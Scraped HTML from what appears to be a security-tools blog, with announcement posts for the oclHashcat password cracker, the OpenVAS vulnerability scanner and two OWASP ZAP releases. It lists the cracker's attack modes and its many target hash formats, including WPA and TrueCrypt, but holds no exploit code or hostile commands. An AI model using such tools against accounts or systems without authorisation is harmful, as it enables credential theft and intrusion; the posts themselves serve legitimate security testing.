    <article class="post hentry" id="1561879296782852803" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> oclHashcat v2.01 - Worlds Fastest Password Cracker  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-1561879296782852803" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-GYHBwiN_kF4/VmM5Hz-YGpI/AAAAAAAAE4w/ZM78P8ravIg/s1600/oclhashcat.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="504" src="http://1.bp.blogspot.com/-GYHBwiN_kF4/VmM5Hz-YGpI/AAAAAAAAE4w/ZM78P8ravIg/s640/oclhashcat.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;"> 
       <strong>oclHashcat</strong> is the world's fastest and most advanced GPGPU-based password recovery utility, supporting five unique modes of attack for over 170 highly-optimized hashing algorithms. oclHashcat currently supports AMD (OpenCL) and Nvidia (CUDA) graphics processors on GNU/Linux and Windows 7/8/10, and has facilities to help enable distributed password cracking.
      </div> 
      <a name="more"></a>
      <br> 
      <h2 style="text-align: justify;"> Features </h2> 
      <ul class="features"> 
       <li class="lite" style="text-align: justify;">Worlds fastest password cracker</li> 
       <li class="lite" style="text-align: justify;">Worlds first and only GPGPU based rule engine</li> 
       <li style="text-align: justify;"><b>Free</b></li> 
       <li style="text-align: justify;"><b>Open-Source</b></li> 
       <li style="text-align: justify;">Multi-GPU (up to 128 gpus)</li> 
       <li style="text-align: justify;">Multi-Hash (up to 100 million hashes)</li> 
       <li style="text-align: justify;">Multi-OS (Linux &amp; Windows native binaries)</li> 
       <li style="text-align: justify;">Multi-Platform (OpenCL &amp; CUDA support)</li> 
       <li style="text-align: justify;">Multi-Algo (see below)</li> 
       <li style="text-align: justify;">Low resource utilization, you can still <b>watch movies</b> or <b>play games</b> while cracking</li> 
       <li style="text-align: justify;">Focuses highly iterated <b>modern hashes</b></li> 
       <li style="text-align: justify;">Focuses dictionary based attacks</li> 
       <li style="text-align: justify;">Supports distributed cracking</li> 
       <li style="text-align: justify;">Supports <b>pause</b> / <b>resume</b> while cracking</li> 
       <li style="text-align: justify;">Supports sessions</li> 
       <li style="text-align: justify;">Supports restore</li> 
       <li style="text-align: justify;">Supports reading words from <b>file</b></li> 
       <li style="text-align: justify;">Supports reading words from <b>stdin</b></li> 
       <li style="text-align: justify;">Supports hex-salt</li> 
       <li style="text-align: justify;">Supports hex-charset</li> 
       <li style="text-align: justify;">Built-in benchmarking system</li> 
       <li style="text-align: justify;">Integrated <b>thermal watchdog</b></li> 
       <li class="last" style="text-align: justify;">... <b>and much more</b></li> 
      </ul> 
      <div style="text-align: justify;"> 
       <b><br></b>
      </div> 
      <h2 style="text-align: justify;"> Attack-Modes</h2> 
      <ul> 
       <li style="text-align: justify;">Straight <sup>*</sup></li> 
       <li style="text-align: justify;"><b>Combination</b></li> 
       <li style="text-align: justify;">Brute-force</li> 
       <li style="text-align: justify;"><b>Hybrid dict + mask</b></li> 
       <li style="text-align: justify;"><b>Hybrid mask + dict</b></li> 
      </ul> 
      <div style="text-align: justify;"> 
       <sup>*</sup> accept Rules 
       <br> 
       <br>
      </div> 
      <h2 style="text-align: justify;"> Algorithms</h2> 
      <ul> 
       <li style="text-align: justify;">MD4</li> 
       <li style="text-align: justify;">MD5</li> 
       <li style="text-align: justify;">Half MD5 (left, mid, right)</li> 
       <li style="text-align: justify;">SHA1</li> 
       <li style="text-align: justify;">SHA-256</li> 
       <li style="text-align: justify;">SHA-384</li> 
       <li style="text-align: justify;">SHA-512</li> 
       <li style="text-align: justify;">SHA-3 (Keccak)</li> 
       <li style="text-align: justify;">SipHash</li> 
       <li style="text-align: justify;">RipeMD160</li> 
       <li style="text-align: justify;">Whirlpool</li> 
       <li style="text-align: justify;">GOST R 34.11-94</li> 
       <li style="text-align: justify;">GOST R 34.11-2012 (Streebog) 256-bit</li> 
       <li style="text-align: justify;">GOST R 34.11-2012 (Streebog) 512-bit</li> 
       <li style="text-align: justify;">Double MD5</li> 
       <li style="text-align: justify;">Double SHA1</li> 
       <li style="text-align: justify;">md5($pass.$salt)</li> 
       <li style="text-align: justify;">md5($salt.$pass)</li> 
       <li style="text-align: justify;">md5(unicode($pass).$salt)</li> 
       <li style="text-align: justify;">md5($salt.unicode($pass))</li> 
       <li style="text-align: justify;">md5(sha1($pass))</li> 
       <li style="text-align: justify;">md5($salt.md5($pass))</li> 
       <li style="text-align: justify;">md5($salt.$pass.$salt)</li> 
       <li style="text-align: justify;">md5(strtoupper(md5($pass)))</li> 
       <li style="text-align: justify;">sha1($pass.$salt)</li> 
       <li style="text-align: justify;">sha1($salt.$pass)</li> 
       <li style="text-align: justify;">sha1(unicode($pass).$salt)</li> 
       <li style="text-align: justify;">sha1($salt.unicode($pass))</li> 
       <li style="text-align: justify;">sha1(md5($pass))</li> 
       <li style="text-align: justify;">sha1($salt.$pass.$salt)</li> 
       <li style="text-align: justify;">sha256($pass.$salt)</li> 
       <li style="text-align: justify;">sha256($salt.$pass)</li> 
       <li style="text-align: justify;">sha256(unicode($pass).$salt)</li> 
       <li style="text-align: justify;">sha256($salt.unicode($pass))</li> 
       <li style="text-align: justify;">sha512($pass.$salt)</li> 
       <li style="text-align: justify;">sha512($salt.$pass)</li> 
       <li style="text-align: justify;">sha512(unicode($pass).$salt)</li> 
       <li style="text-align: justify;">sha512($salt.unicode($pass))</li> 
       <li style="text-align: justify;">HMAC-MD5 (key = $pass)</li> 
       <li style="text-align: justify;">HMAC-MD5 (key = $salt)</li> 
       <li style="text-align: justify;">HMAC-SHA1 (key = $pass)</li> 
       <li style="text-align: justify;">HMAC-SHA1 (key = $salt)</li> 
       <li style="text-align: justify;">HMAC-SHA256 (key = $pass)</li> 
       <li style="text-align: justify;">HMAC-SHA256 (key = $salt)</li> 
       <li style="text-align: justify;">HMAC-SHA512 (key = $pass)</li> 
       <li style="text-align: justify;">HMAC-SHA512 (key = $salt)</li> 
       <li style="text-align: justify;">PBKDF2-HMAC-MD5</li> 
       <li style="text-align: justify;">PBKDF2-HMAC-SHA1</li> 
       <li style="text-align: justify;">PBKDF2-HMAC-SHA256</li> 
       <li style="text-align: justify;">PBKDF2-HMAC-SHA512</li> 
       <li style="text-align: justify;">MyBB</li> 
       <li style="text-align: justify;">phpBB3</li> 
       <li style="text-align: justify;">SMF</li> 
       <li style="text-align: justify;">vBulletin</li> 
       <li style="text-align: justify;">IPB</li> 
       <li style="text-align: justify;">Woltlab Burning Board</li> 
       <li style="text-align: justify;">osCommerce</li> 
       <li style="text-align: justify;">xt:Commerce</li> 
       <li style="text-align: justify;">PrestaShop</li> 
       <li style="text-align: justify;">Mediawiki B type</li> 
       <li style="text-align: justify;">Wordpress</li> 
       <li style="text-align: justify;">Drupal</li> 
       <li style="text-align: justify;">Joomla</li> 
       <li style="text-align: justify;">PHPS</li> 
       <li style="text-align: justify;">Django (SHA-1)</li> 
       <li style="text-align: justify;">Django (PBKDF2-SHA256)</li> 
       <li style="text-align: justify;">EPiServer</li>

       <li style="text-align: justify;">MSSQL</li> 
       <li style="text-align: justify;">Oracle H: Type (Oracle 7+)</li> 
       <li style="text-align: justify;">Oracle S: Type (Oracle 11+)</li> 
       <li style="text-align: justify;">Oracle T: Type (Oracle 12+)</li> 
       <li style="text-align: justify;">Sybase</li> 
       <li style="text-align: justify;">hMailServer</li>

       <li style="text-align: justify;">Cram MD5</li>

       <li style="text-align: justify;">PostgreSQL Challenge-Response Authentication (MD5)</li> 
       <li style="text-align: justify;">SIP Digest Authentication (MD5)</li> 
       <li style="text-align: justify;">WPA</li> 
       <li style="text-align: justify;">WPA2</li>

       <li style="text-align: justify;">Blockchain, My Wallet</li>

       <li style="text-align: justify;">TrueCrypt 5.0+</li>

      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="http://hashcat.net/oclhashcat/" target="_blank">Download&nbsp;oclHashcat v2.01</a></span></b>

    <article class="post hentry" id="7960898704356772359" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> OpenVAS - The World's Most Advanced Open Source Vulnerability Scanner and Manager  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-7960898704356772359" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-PrTgpoRMggY/VVzhMoDYvUI/AAAAAAAAECo/ROMsfQ5TxfU/s1600/OpenVAS.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="640" src="http://1.bp.blogspot.com/-PrTgpoRMggY/VVzhMoDYvUI/AAAAAAAAECo/ROMsfQ5TxfU/s640/OpenVAS.png" width="610"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        The Open Vulnerability Assessment System (OpenVAS) is a framework of several services and tools. The core of this SSL-secured service-oriented architecture is the 
       <b>OpenVAS Scanner</b>. The scanner very efficiently executes the actual Network Vulnerability Tests (NVTs) which are served with daily updates via the OpenVAS NVT Feed or via a commercial feed service.
       <br> 
       <a name="more"></a>
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-x4UZqYccX_Q/VVzheSSkBCI/AAAAAAAAECw/TtjB5qiKiC8/s1600/OpenVAS-7-Software.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-x4UZqYccX_Q/VVzheSSkBCI/AAAAAAAAECw/TtjB5qiKiC8/s1600/OpenVAS-7-Software.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        The 
       <b>OpenVAS Manager</b> is the central service that consolidates plain vulnerability scanning into a full vulnerability management solution. The Manager controls the Scanner via OTP (OpenVAS Transfer Protocol) and itself offers the XML-based, stateless OpenVAS Management Protocol (OMP). All intelligence is implemented in the Manager so that it is possible to implement various lean clients that will behave consistently e.g. with regard to filtering or sorting scan results. The Manager also controls a SQL database (sqlite-based) where all configuration and scan result data is centrally stored. Finally, Manager also handles user management includiung access control with groups and roles.
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
      </div> 
      <br> 
      <center> 
       <img alt="The OpenVAS protocols" src="http://www.openvas.org/img/OpenVAS-7-Protocols.png">
      </center> 
      <br> 
      <div style="text-align: justify;">
        Different OMP clients are available: The 
       <b>Greenbone Security Assistant</b> (GSA) is a lean web service offering a user interface for web browsers. GSA uses XSL transformation stylesheet that converts OMP responses into HTML. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <br> 
      <div style="text-align: justify;"> 
       <b>OpenVAS CLI</b> contains the command line tool "omp" which allows to create batch processes to drive OpenVAS Manager. Another tool of this package is a Nagios plugin.&nbsp;
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-FJlA-96zBPg/VVziExhVrzI/AAAAAAAAEDA/Loc_4vDIVv8/s1600/OpenVAS-7-KeyTechnologies.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-FJlA-96zBPg/VVziExhVrzI/AAAAAAAAEDA/Loc_4vDIVv8/s1600/OpenVAS-7-KeyTechnologies.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Most of the tools listed above share functionality that is aggregated in the 
       <b>OpenVAS Libraries</b>. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        The OpenVAS Scanner offers the communication protocol OTP (OpenVAS Transfer Protocol) which allows to control the scan execution. This protocol is subject to be eventually replaced and thus it is not recommended to develop OTP clients. 
      </div> 
      <h3 style="text-align: justify;"> Feature overview </h3> 
      <a href="https://draft.blogger.com/null" name="feature_overview"></a> 
      <br> 
      <ul> 
       <li>
        <div style="text-align: justify;">
          OpenVAS Scanner
        </div> </li> 
       <ul> 
        <li>
         <div style="text-align: justify;">
           Many target hosts are scanned concurrently
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           OpenVAS Transfer Protocol (OTP)
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           SSL support for OTP (always)
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           WMI support (optional)
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           ...
         </div> </li> 
       </ul> 
       <li>
        <div style="text-align: justify;">
          OpenVAS Manager
        </div> </li> 
       <ul> 
        <li>
         <div style="text-align: justify;">
           OpenVAS Management Protocol (OMP)
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           SQL Database (sqlite) for configurations and scan results
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           SSL support for OMP (always)
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Many concurrent scans tasks (many OpenVAS Scanners)
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Notes management for scan results
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           False Positive management for scan results
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Scheduled scans
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Flexible escalators upon status of a scan task
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Stop, Pause and Resume of scan tasks
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Master-Slave Mode to control many instances from a central one
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Reports Format Plugin Framework with various plugins for: XML, HTML, LateX, etc.
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           User Management
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Feed status view
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Feed synchronisation
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           ...
         </div> </li> 
       </ul> 
       <li>
        <div style="text-align: justify;">
          Greenbone Security Assistant (GSA)
        </div> </li> 
       <ul> 
        <li>
         <div style="text-align: justify;">
           Client for OMP and OAP
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           HTTP and HTTPS
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Web server on its own (microhttpd), thus no extra web server required
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Integrated online-help system
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Multi-language support
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           ...
         </div> </li> 
       </ul> 
       <li>
        <div style="text-align: justify;">
          OpenVAS CLI
        </div> </li> 
       <ul> 
        <li>
         <div style="text-align: justify;">
           Client for OMP
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Runs on Windows, Linux, etc.
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           Plugin for Nagios
         </div> </li> 
        <li>
         <div style="text-align: justify;">
           ...
         </div> </li> 
       </ul> 
      </ul> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="http://www.openvas.org/download.html" target="_blank">Download OpenVAS</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="7200664678958202624" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> OWASP ZAP 2.4.0 - Penetration Testing Tool for Testing Web Applications  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-7200664678958202624" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-oG3PCDp9JWs/VSZjv-WQkgI/AAAAAAAAAYg/KwhC2F3mABM/s1600/zap256x256.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-oG3PCDp9JWs/VSZjv-WQkgI/AAAAAAAAAYg/KwhC2F3mABM/s1600/zap256x256.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        ZAP is an OWASP 
       <a href="https://www.owasp.org/index.php/OWASP_Project_Inventory#tab=Flagship_Projects">Flagship</a> project, and is currently the most active open source web application security tool.
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        For a quick introduction to the new release see this video:
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <iframe allowfullscreen frameborder="0" height="360" src="https://www.youtube.com/embed/TyhaA3DJ5oM" width="640"></iframe>
      </div> 
      <br> 
      <br> 
      <div style="text-align: justify;">
        Some of the most significant changes include:
      </div> 
      <h3 style="text-align: justify;"> ‘Attack’ Mode</h3> 
      <div style="text-align: justify;">
        A new ‘attack’ mode has been added that means that applications that you have specified are in scope are actively scanned as they are discovered.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <h3 style="text-align: justify;"> Advanced Fuzzing</h3> 
      <div style="text-align: justify;">
        A completely new fuzzing dialog has been introduced that allows multiple injection points to be attacked at the same time, as well as introducing new attack payloads including the option to use scripts for generating the payloads as well as pre and post attack manipulation and analysis.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <h3 style="text-align: justify;"> Scan Policies</h3> 
      <div style="text-align: justify;">
        Scan policies define exactly which rules are run as part of an active scan.
      </div> 
      <div style="text-align: justify;">
        They also define how these rules run influencing how many requests are made and how likely potential issues are to be flagged.
      </div> 
      <div style="text-align: justify;">
        The new Scan Policy Manager dialog allows you to create, import and export as many scan policies as you need. You select any scan policy when you start an active scan and also specify the one used by the new attack mode.
      </div> 
      <div style="text-align: justify;">
        Scan policy dialog boxes allow sorting by any column, and include a quality column (indicating if individual scanners are Release, Beta, or Alpha quality).
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <h3 style="text-align: justify;"> Scan Dialogs with Advanced Options</h3> 
      <div style="text-align: justify;">
        New Active Scan and Spider dialogs have replaced the increasing number of right click 'Attack' options. These provide easy access to all of the most common options and optionally a wide range of advanced options.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <h3 style="text-align: justify;"> Hiding Unused Tabs</h3> 
      <div style="text-align: justify;">
        By default only the essential tabs are now shown when ZAP starts up.
      </div> 
      <div style="text-align: justify;">
        The remaining tabs are revealed when they are used (e.g. for the spider and active scanner) or when you display them via the special tab on the far right of each window with the green '+' icon. This special tab disappears if there are no hidden tabs.
      </div> 
      <div style="text-align: justify;">
        Tabs can be closed via a small 'x' icon which is shown when the tab is selected.
      </div> 
      <div style="text-align: justify;">
        Tabs can also be 'pinned' using a small 'pin' icon that is also shown when the tab is selected - pinned tabs will be shown when ZAP next starts up.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <h3 style="text-align: justify;"> New Add-ons</h3> 
      <div style="text-align: justify;">
        Two significant new ‘alpha’ quality add-ons are available:
      </div> 
      <ul> 
       <li style="text-align: justify;">Access Control Testing: adds the ability to automate many aspects of access control testing.</li> 
       <li style="text-align: justify;">Sequence Scanning: adds the ability to scan 'sequences' of web pages, in other words pages that must be visited in a strict order in order to work correctly.</li> 
      </ul> 
      <div style="text-align: justify;">
        These can both be downloaded from the ZAP Marketplace.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <h3 style="text-align: justify;"> New Scan Rules</h3> 
      <div style="text-align: justify;">
        A number of significant new ‘alpha’ quality scanners are available:
      </div> 
      <ul> 
       <li style="text-align: justify;">Relative Path Confusion: Allows ZAP to scan for issues that may result in XSS, by detecting if the browser can be fooled into interpreting HTML as CSS.</li> 
       <li style="text-align: justify;">Proxy Disclosure: Allows ZAP to detect forward and reverse proxies between the ZAP instance and the origin web server / application server.</li> 
       <li style="text-align: justify;">Storability / Cacheability: Allows ZAP to passively determine whether a page is storable by a shared cache, and whether it can be served from that cache in response to a similar request. This is useful from both a privacy and application performance perspective. The scanner follows RFC 7234.</li> 
      </ul> 
      <div style="text-align: justify;">
        Support has also been added for Direct Web Remoting as an input vector for all scan rules.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <h3 style="text-align: justify;"> Changed Scan Rules</h3> 
      <ul> 
       <li style="text-align: justify;">External Redirect: This plugin’s ID has been changed from 30000 to 20019, in order to more closely align with the established groupings. (This change may be of importance to **API Users**). Additionally some minor changes have been implemented to prevent collisions between injected values and in-page content, and improve performance. (Issues: 1529 and 1569)</li> 
       <li style="text-align: justify;">Session ID in URL Rewrite: This plugin has been updated with a minimum length check for the value of the parameters it looks for. A false positive condition was raised related to this plugin (Issue 1396) whereby sID=5 would trigger a finding. Minimum length for session IDs as this plugin interprets them is now eight (8) characters.</li> 
       <li style="text-align: justify;">Client Browser Cache: The active scan rule TestClientBrowserCache has been removed. Checks performed by the passive scan rule CacheControlScanner have been slightly modified. (Issue 1499)</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <h3 style="text-align: justify;"> More User Interface Changes</h3> 
      <ul> 
       <li style="text-align: justify;">The ZAP splash screen is back: It now includes new graphics, a tips &amp; tricks module, and loading/progress info.</li> 
       <li style="text-align: justify;">The active scan dialog show the real plugin’s progress status based on the number of nodes that need to be scanned.</li> 
       <li style="text-align: justify;">There is a new session persistence options dialog that prompts the user for their preferred settings at startup (you can choose to “Remember” the option and not be asked again).</li> 
       <li style="text-align: justify;">For all Alerts the Risk field (False Positive, Suspicious, Warning) has been replaced with a more appropriately defined Confidence field (False Positive, Low, Medium, High, or Confirmed).</li> 
       <li style="text-align: justify;">Timestamps are now optionally available for the output tab.</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <h3 style="text-align: justify;"> Extended API Support</h3> 
      <div style="text-align: justify;">
        The API now supports the spidering and active scanning or multiple targets concurrently, the management of scan policies as well as even more of the ZAP functionality. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <h3 style="text-align: justify;"> Internationalized Help Add-ons</h3> 
      <div style="text-align: justify;">
        The help files are internationalized via 
       <a href="https://crowdin.net/project/owasp-zap-help">https://crowdin.net/project/owasp-zap-help</a>.
      </div> 
      <div style="text-align: justify;">
        If you use ZAP in one of the many languages we support, then look on the ZAP Marketplace to see if the help files for that language are available. These will include all of the available translations for that language while defaulting back to English for phrases that have not yet been translated.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <h3 style="text-align: justify;"> Release Notes</h3> 
      <div style="text-align: justify;">
        See the Release Notes (
       <a href="https://code.google.com/p/zaproxy/wiki/HelpReleases2_4_0">https://code.google.com/p/zaproxy/wiki/HelpReleases2_4_0</a>) for a full list of all of the changes included in this release.
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="http://code.google.com/p/zaproxy/wiki/Downloads?tm=2" target="_blank">Download ZAP 2.4.0</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="6669288798363352533" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> OWASP ZAP 2.4.1 - Penetration Testing Tool for Testing Web Applications  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-6669288798363352533" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-ddGDU2tgR9Y/Vb7uAi7eiEI/AAAAAAAAEcI/bon6icqWTUI/s1600/zap.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="490" src="http://2.bp.blogspot.com/-ddGDU2tgR9Y/Vb7uAi7eiEI/AAAAAAAAEcI/bon6icqWTUI/s640/zap.jpg" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        The OWASP Zed Attack Proxy (ZAP) is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        It is designed to be used by people with a wide range of security experience and as such is ideal for developers and functional testers who are new to penetration testing as well as being a useful addition to an experienced pen testers toolbox.
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Release 2.4.1</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        This release includes important security fixes - users are urged to upgrade asap.
       <br> 
       <br>
      </div> 
      <div style="text-align: justify;">
        One of the changes means that an API key is created by default, which means that any applications using the ZAP API will fail unless they are updated to use that key. The API Key can be found in the 
       <a href="https://github.com/zaproxy/zap-core-help/wiki/HelpUiDialogsOptionsApi">API Options screen</a> You can also set it from the command line using an option like:
      </div> 
      <pre style="text-align: justify;"><code>-config api.key=change-me-9203935709
</code></pre> 
      <div style="text-align: justify;">
        For more details see 
       <a href="https://github.com/zaproxy/zaproxy/wiki/FAQapikey">https://github.com/zaproxy/zaproxy/wiki/FAQapikey</a>
      </div> 
      <div style="text-align: justify;">
        The following changes were made in this release:
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Enhancements:</b>
      </div> 
      <ul> 
       <li style="text-align: justify;"> Issue 321 : Support multiple databases</li> 
       <li style="text-align: justify;"> Issue 1459 : Add an HTTP sender listener script</li> 
       <li style="text-align: justify;"> Issue 1500 : Update Bouncy Castle libs</li> 
       <li style="text-align: justify;"> Issue 1566 : Improve active scan's reported progress</li> 
       <li style="text-align: justify;"> Issue 1573 : Add option to inject plugin ID in header for all ascan requests</li> 
       <li style="text-align: justify;"> Issue 1607 : Unable to save the test session via API</li> 
       <li style="text-align: justify;"> Issue 1621 : AScan API - Allow to scan as an user</li> 
       <li style="text-align: justify;"> Issue 1625 : Support multiple structural params and ones on top level nodes</li> 
       <li style="text-align: justify;"> Issue 1653 : Support context menu key for trees</li> 
       <li style="text-align: justify;"> Issue 1655 : Copy Session Token from Http Sessions tab to clipboard</li> 
       <li style="text-align: justify;"> Issue 1662 : Add default Rails anti-CSRF token parameter</li> 
       <li style="text-align: justify;"> Issue 1664 : Clients tab autoscroll</li> 
       <li style="text-align: justify;"> Issue 1684 : Unable to set technology via API</li> 
       <li style="text-align: justify;"> Issue 1688 : Updating owasp/zap2docker image with Python Client API</li> 
       <li style="text-align: justify;"> Issue 1690 : Bump key pair size to 2048 for all certs in the (proxy's) chain of trust</li> 
       <li style="text-align: justify;"> Issue 1695 : Change SSL cert signature algorithm to "SHA-256 with RSA Encryption"</li> 
       <li style="text-align: justify;"> Issue 1699 : Allow ApiImplementor's to add custom headers</li> 
       <li style="text-align: justify;"> Issue 1715 : Unable to pass arguments when launching ZAP from the command line on Mac OS X</li> 
       <li style="text-align: justify;"> Issue 1728 : Update JRE to 1.7u79 (CPU) for MacOS</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Bug fixes:</b>
      </div> 
      <ul> 
       <li style="text-align: justify;"> Issue 444 : Guaranteed NPE on AliasCertificate.getName() if getCN()==null</li> 
       <li style="text-align: justify;"> Issue 1442 : Up/Down arrow keys in results stop working if "reflected"</li> 
       <li style="text-align: justify;"> Issue 1473 : Spider does not handle URLs extracted from meta tags correctly</li> 
       <li style="text-align: justify;"> Issue 1497 : The spider is extracting and reporting links from comments - event when instructed not to do so</li> 
       <li style="text-align: justify;"> Issue 1598 : startup script lacks support for FreeBSD</li> 
       <li style="text-align: justify;"> Issue 1615 : Search "All" option not working</li> 
       <li style="text-align: justify;"> Issue 1617 : ZAP 2.4.0 throws HeadlessExceptions when running in daemon mode on headless machine</li> 
       <li style="text-align: justify;"> Issue 1618 : Target Technology Not Honored</li> 
       <li style="text-align: justify;"> Issue 1619 : Search regex might not be validated</li> 
       <li style="text-align: justify;"> Issue 1624 : Error while loading ZAP 2.4.0</li> 
       <li style="text-align: justify;"> Issue 1626 : Structural parameters not saved when context exported and not available via the API</li> 
       <li style="text-align: justify;"> Issue 1636 : Users (for auth) &amp; Forced User not loaded from session</li> 
       <li style="text-align: justify;"> Issue 1647 : Wrong reference in Zest Result</li> 
       <li style="text-align: justify;"> Issue 1674 : Ajax spider not considering get parameters</li> 
       <li style="text-align: justify;"> Issue 1677 : Fuzzers can't be expanded on OS X</li> 
       <li style="text-align: justify;"> Issue 1694 : "Error: setting file is missing. Program will exit." even if file exists</li> 
       <li style="text-align: justify;"> Issue 1698 : Escape API exceptions</li> 
       <li style="text-align: justify;"> Issue 1700 : Forced Browse Lists Missing from Drop-Down in 2.4.0</li> 
       <li style="text-align: justify;"> Issue 1706 : Add API security options</li> 
       <li style="text-align: justify;"> Issue 1708 : Context's technology tree can get out of sync</li> 
       <li style="text-align: justify;"> Issue 1709 : Applications are not (immediately) shown after start</li> 
       <li style="text-align: justify;"> Issue 1714 : PNH should not reflect API key unless user supplies it</li> 
       <li style="text-align: justify;"> Issue 1716 : Restrict use of CORS header in pnh</li> 
       <li style="text-align: justify;"> Issue 1720 : Add more security options for JSONP API</li> 
       <li style="text-align: justify;"> Issue 1724 : Ensure API component names are escaped in the HTML output</li> 
       <li style="text-align: justify;"> Issue 1735 : Context's technologies not used in active scan unless overridden</li> 
      </ul> 
      <div> 
       <br>
      </div> 
      <div> 
       <div style="text-align: center;"> 
        <b><span style="font-size: x-large;"><a href="https://github.com/zaproxy/zaproxy/wiki/Downloads" target="_blank">Download&nbsp;OWASP ZAP 2.4.1</a></span></b>
       </div> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="8838570509661141065" itemscope itemtype="http://schema.org/BlogPosting"> 
